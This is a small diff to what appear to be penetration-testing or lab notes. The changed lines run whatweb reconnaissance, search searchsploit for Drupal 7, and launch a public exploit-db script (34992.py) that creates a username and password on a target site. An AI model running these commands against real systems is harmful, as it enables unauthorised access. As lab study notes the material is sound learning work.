@@ -55,7 +55,7 @@ whatweb [targetIP]
 # look for vulnerabilities using searchploit, the video shows the technology "drupal 7"
 searchploit drupal 7 > result shows the exploit title and path 
 
-# Launch the python script showed in searchploit
+# Launch the python script showed in searchploit to create user name and password
 python /usr/share/exploitdb/exploits/php/webapps/34992.py -u syberoffense -p Password123! -t http://[targetIP]
 
 
